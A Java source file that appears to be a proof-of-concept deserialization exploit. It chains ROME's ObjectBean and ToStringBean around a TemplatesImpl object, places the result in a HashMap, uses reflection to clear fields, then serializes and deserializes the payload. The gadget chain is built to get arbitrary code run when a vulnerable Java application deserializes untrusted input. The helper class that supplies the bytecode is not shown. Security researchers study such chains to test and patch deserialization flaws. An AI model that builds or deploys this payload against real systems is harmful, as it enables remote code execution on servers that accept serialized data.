package com.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.xml.transform.Templates;
import java.util.HashMap;

public class ObjectBeanChain {
    public static void main(String[] args) throws Exception {
        TemplatesImpl tpl = Utils.getTemplatesImpl();

        ToStringBean toStringBean = new ToStringBean(Templates.class, tpl);

        ObjectBean objectBean = new ObjectBean(ToStringBean.class,toStringBean);

        HashMap hashMap = new HashMap();
        hashMap.put(objectBean,"0w0");

        Utils.SetValue(objectBean, "_cloneableBean", null);
        Utils.SetValue(objectBean, "_toStringBean", null);

        String barr = Utils.Serialize(hashMap);
        System.out.println(barr);
        Utils.UnSerialize(barr);
    }
}
